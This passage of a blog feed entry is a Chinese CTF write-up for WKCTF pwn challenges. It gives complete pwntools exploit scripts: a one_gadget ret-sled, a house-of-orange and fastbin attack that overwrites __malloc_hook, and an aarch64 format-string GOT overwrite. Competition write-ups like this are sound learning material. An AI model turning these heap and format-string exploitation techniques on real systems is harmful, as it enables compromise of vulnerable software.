class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'110.40.35.73'</span><span class="token punctuation">,</span> <span class="token number">33688</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'continue'</span><span class="token punctuation">,</span> <span class="token string">b'\n'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'number'</span><span class="token punctuation">,</span> <span class="token string">b'6'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'is: '</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3ec7e3</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.27/libc-2.27.so'</span><span class="token punctuation">)</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f2a5</span><span class="token punctuation">,</span> <span class="token number">0x4f302</span><span class="token punctuation">,</span> <span class="token number">0x10a2fc</span><span class="token punctuation">]</span>ogg <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseret <span class="token operator">=</span> <span class="token number">0x00000000000008aa</span> <span class="token operator">+</span> libc_baser<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'256)? '</span><span class="token punctuation">,</span> <span class="token string">b'256'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">31</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ogg<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="easy-heap"><a href="#easy-heap" class="headerlink" title="easy_heap"></a>easy_heap</h3><p>漏洞点出在<code>edit</code>可以堆溢出</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">edit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> index<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-10h] BYREF</span>  _DWORD size<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-Ch] BYREF</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>size<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  size<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Size :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> size<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0x1000u</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"too large"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Content :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> chunk_ptr<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">,</span> size<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>size<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>没有<code>delete</code>且限制了<code>show</code>的长度为一个地址，首先想到的就是<code>house of orange</code></p><p>伪造<code>top chunk</code>的条件：</p><ul><li>保证原本<code>old top chunk</code>的<code>size</code>大于<code>MINSIZE</code></li><li>保证原本<code>old top chunk</code>的<code>prev_inuse</code>位是<code>1</code></li><li>原本<code>old top chunk</code>的地址加上其<code>size</code>之后的地址要与页对齐 也就是<code>address &amp; 0xfff = 0x000</code></li><li><code>old chunk</code>的<code>size</code>要小于申请的堆块大小加上<code>MINSIZE</code></li></ul><p>当申请的堆大小大于伪造的<code>top chunk</code>大小时会将<code>top chunk</code>释放，释放的大小为<code>top chunk size - 0x20</code>，并且根据释放的大小判断进入<code>fastbin</code>或者<code>unsorted bin</code></p><p>所以本题可以先释放一次<code>top chunk</code>到<code>unsorted bin</code>泄露<code>libc</code>，再释放一次<code>top chunk</code>到<code>fastbin</code>进行<code>fastbin attack</code></p><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'110.40.35.73'</span><span class="token punctuation">,</span> <span class="token number">33747</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Size'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Content'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Size'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Content'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0xdf8</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x1e1</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0xdf8</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x1b8</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3c4b61</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.23/libc-2.23.so'</span><span class="token punctuation">)</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45226</span><span class="token punctuation">,</span> <span class="token number">0x4527a</span><span class="token punctuation">,</span> <span class="token number">0xf03a4</span><span class="token punctuation">,</span> <span class="token number">0xf1247</span><span class="token punctuation">]</span>ogg <span class="token operator">=</span> libc_base <span class="token operator">+</span> one<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>malloc_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x1e1</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x148</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0xdf8</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x148</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>malloc_hook <span class="token operator">-</span> <span class="token number">0x23</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">19</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ogg<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Size'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="something-changed"><a href="#something-changed" class="headerlink" title="something_changed"></a>something_changed</h3><p>漏洞点是格式化字符串，并且存在后门，限制了输入内容不能包含<code>$</code>，但还是可以直接用<code>fmtstr_payload</code>工具</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token class-name">size_t</span> v4<span class="token punctuation">;</span> <span class="token comment">// x19</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [xsp+FCCh] [xbp+2Ch]</span>  <span class="token keyword">char</span> v6<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [xsp+FD0h] [xbp+30h] BYREF</span>  __int64 v7<span class="token punctuation">;</span> <span class="token comment">// [xsp+FF8h] [xbp+58h]</span>  v7 <span class="token operator">=</span> _bss_start<span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> v6<span class="token punctuation">,</span> <span class="token number">0x50uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v4 <span class="token operator">=</span> i<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">>=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>v6<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"$"</span> <span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">printf</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试出偏移是<code>14</code>，开了<code>canary</code>保护，所以可以将<code>__stack_chk_fail_got</code>改成<code>backdoor</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> qemu-aarch64 <span class="token parameter variable">-L</span> ./libc/libc/lib ./pwn        aaaaaaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%paaaaaaaa-0x7f3e313a1400-0x2d70252d70252d70-0xa7025-0x7f3e313a1448-<span class="token punctuation">(</span>nil<span class="token punctuation">)</span>-0x8080808080-0x2c6f242c6f242c6f-0x7f3e313a13e0-0x7f3e30a48a00-0x400888-0x4008c0-0x7f3e313a13e0-0x4b30a489ac-0x6161616161616161-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'aarch64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'120.79.91.95'</span><span class="token punctuation">,</span> <span class="token number">3332</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-aarch64"</span><span class="token punctuation">,</span> <span class="token string">"-g"</span><span class="token punctuation">,</span> <span class="token string">"1234"</span><span class="token punctuation">,</span> <span class="token string">"./pwn"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>p <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">0x411018</span><span class="token punctuation">:</span><span class="token number">0x400770</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> write_size<span class="token operator">=</span><span class="token string">'short'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;题目下载地址：&lt;a href=&quot;https://github.com/0xviol1t/CTF-challenges/tree/main/2024/WKCTF&quot;&gt;https://github.com/0xviol1t/CTF-challenges/tree/main/202</summary>
      
    
    
    
    <category term="WP" scheme="https://starrysky1004.github.io/categories/WP/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
    <category term="heap" scheme="https://starrysky1004.github.io/tags/heap/"/>
    
    <category term="aarch64" scheme="https://starrysky1004.github.io/tags/aarch64/"/>
    
  </entry>
  
</feed>
